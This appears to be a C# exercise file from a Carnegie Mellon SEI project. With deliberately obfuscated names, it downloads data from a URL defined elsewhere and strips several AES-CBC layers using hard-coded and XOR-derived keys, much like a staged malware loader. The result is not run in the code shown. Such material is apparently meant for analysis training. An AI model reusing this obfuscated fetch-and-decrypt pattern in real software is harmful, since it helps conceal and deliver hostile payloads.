/*
Copyright 2022 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace x
{
    class g
    {
        static void Main(string[] xo)
        {
            C().GetAwaiter().GetResult();
        }

        static async Task C()
        {
            byte[][] f = new byte[4][];
            f[0] = new byte[] { 151, 82, 254, 123, 105, 128, 154, 235, 40, 104, 177, 93, 153, 205, 206, 36 };
            f[1] = new byte[] { 183, 90, 159, 24, 247, 9, 132, 32, 198, 125, 111, 7, 162, 223, 198, 134 };
            f[2] = new byte[] { 76, 189, 179, 117, 170, 178, 197, 134, 148, 55, 45, 122, 45, 98, 147, 125 };
            f[3] = new byte[] { 214, 40, 66, 129, 252, 175, 225, 239, 197, 185, 117, 50, 162, 148, 171, 11 };

            HttpClient z = new();
            var fw = await z.GetAsync(x.MV.Y[0]);
            var W = await fw.Content.ReadAsByteArrayAsync();

            byte[] f8;

            f8 = W.Take(16).ToArray();
            W = W.Skip(16).ToArray();
            W = h(W, f8);

            W = k(W);

            W = r(W);

            foreach (var key in f.Reverse())
            {
                f8 = W.Take(16).ToArray();
                W = W.Skip(16).ToArray();
                W = l9(W, f8, key);
            }
        }

        static byte[] h(byte[] l, byte[] f8)
        {
            return l9(l, f8, new byte[] { 87, 40, 49, 153, 183, 115, 86, 62, 96, 251, 174, 183, 17, 247, 81, 177 });
        }

        static byte[] t(byte[] l)
        {
            byte[] M = new byte[] { 76, 191, 10, 248, 14, 117, 44, 8, 20, 221, 107, 224, 59, 36, 125, 154 };
            byte[] W = l.Skip(16).ToArray();
            byte[] f8 = l.Take(16).ToArray();
            return l9(W, f8, M);
        }

        static byte[] k(byte[] l)
        {
            byte[] M = new byte[] { 166, 223, 26, 65, 249, 49, 214, 197, 12, 73, 77, 34, 27, 89, 107, 115 };
            byte[] W = t(l);
            byte[] f8 = W.Take(16).ToArray();
            W = W.Skip(16).ToArray();
            return l9(W, f8, M);
        }

        static byte[] r(byte[] l)
        {
            byte[] CV = { 52, 144, 221, 76, 138, 177, 86, 232, 159, 181, 115, 16, 57, 223, 134, 136 };
            byte[] y = { 191, 5, 104, 52, 84, 113, 124, 249, 64, 233, 73, 238, 107, 182, 57, 245 };
            byte[] f8 = l.Take(16).ToArray();
            byte[] W = l.Skip(16).ToArray();
            return l9(W, f8, j(CV, y));
        }

        static byte[] j(byte[] l, byte[] M)
        {
            byte[] I = (byte[])l.Clone();
            for (int J = 0; J < M.Length; J++)
            {
                I[J] ^= M[J];
            }
            return I;
        }

        static byte[] l9(byte[] l, byte[] f8, byte[] M)
        {
            using (Aes xs = Aes.Create())
            {
                xs.Key = M;
                xs.BlockSize = 128;
                xs.Mode = CipherMode.CBC;
                xs.Padding = PaddingMode.PKCS7;

                xs.IV = f8;

                using (MemoryStream Je = new(l))
                {
                    using (CryptoStream G = new(Je, xs.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (MemoryStream O = new())
                        {
                            G.CopyTo(O);
                            return O.ToArray();
                        }
                    }
                }
            }
        }
    }
}

